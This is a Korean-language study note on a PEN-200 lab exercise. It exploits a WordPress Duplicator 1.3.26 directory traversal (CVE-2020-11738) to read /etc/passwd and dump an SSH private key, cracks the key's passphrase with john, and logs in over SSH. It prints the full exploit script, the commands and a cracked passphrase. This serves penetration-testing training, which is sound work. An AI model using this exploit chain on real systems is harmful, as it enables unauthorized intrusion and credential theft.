# 27.2.1 초기 발판 확보

> **Initial Foothold** · PEN-200 §27.2.1

Duplicator 1.3.26 에 걸린 두 익스플로잇 중 Metasploit 이 아닌 쪽(ExploitDB ID 50420)을 봄. searchsploit 은 `-x` 로 내용 열람, `-m` 으로 현재 디렉터리 복사를 지원함.

```
kali@kali:~/beyond$ searchsploit -x 50420
```

CVE-2020-11738 — Duplicator 의 디렉터리 트래버설임. 파이썬 코드 자체는 단순해서, `/wp-admin/admin-ajax.php?action=duplicator_download&file=` 뒤에 `../` 를 잔뜩 붙인 경로를 GET 으로 던지는 것이 전부임. 인증이 필요 없다는 점이 핵심임.

```
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File
Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738
import requests as re
import sys
if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()
arg = sys.argv[1]
file = sys.argv[2]
URL = arg + "/wp-admin/admin-
ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
output = re.get(url = URL)
print(output.text)
```
*익스플로잇 전문 — 인자는 URL 과 읽을 파일 경로 둘뿐이고 `URL` 조립 줄이 트래버설의 실체임*

익스플로잇을 작업 디렉터리로 복사함.

```
kali@kali:~/beyond$ cd beyond/websrv1
kali@kali:~/beyond/websrv1$ searchsploit -m 50420
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
File Type: ASCII text
Copied to: /home/kali/beyond/websrv1/50420.py
```
*`-m` 은 현재 디렉터리로 복사 — 복사본 경로가 출력됨*

```
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
*`/etc/passwd` 덤프 — `...` 은 교재가 중간을 생략한 표시임*

`/etc/passwd` 를 읽어 취약 여부 확인과 계정명 수집을 한 번에 해결함 — 사용자 `daniela`(uid 1001)와 `marcus`(uid 1002) 확보, `creds.txt` 에 기록.

트래버설로 노릴 다음 표적은 권한이 지나치게 열려 있는 SSH 개인키임. 파일명은 `ssh-keygen` 으로 만들 때 지정한 타입에 따라 달라짐 — `ecdsa` 를 고르면 기본 이름이 `id_ecdsa` 가 되므로 `id_rsa` 하나만 보고 없다고 단정하지 말 것.


*marcus 는 `Invalid installer file name!!` 로 실패하고 daniela 의 개인키만 덤프됨 — 명령이 두 줄로 보이는 것은 교재 지면 폭 때문임*

덤프된 키를 현재 디렉터리에 `id_rsa` 로 저장함.

```
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
```

키에 패스프레이즈가 걸려 있으므로 `ssh2john` 으로 해시를 뽑고 `john` 에 `rockyou.txt` 를 물려 크랙함 — `tequieromucho` 로 풀림.

```
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash
kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa)
...
```
*크랙된 패스프레이즈가 `(id_rsa)` 옆에 찍힘 — `...` 은 교재가 생략한 표시임*

```
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$
```
*패스프레이즈를 넣으면 셸 프롬프트가 `daniela@websrv1` 로 바뀜 — 첫 발판 확보*

패스프레이즈를 넣어 `daniela` 로 SSH 접속 성공, 첫 대상 장악. 사용자는 비밀번호와 패스프레이즈를 재사용하는 경향이 있으므로 크랙한 값도 `creds.txt` 에 남길 것 — 뒤에서 다시 쓰게 됨.
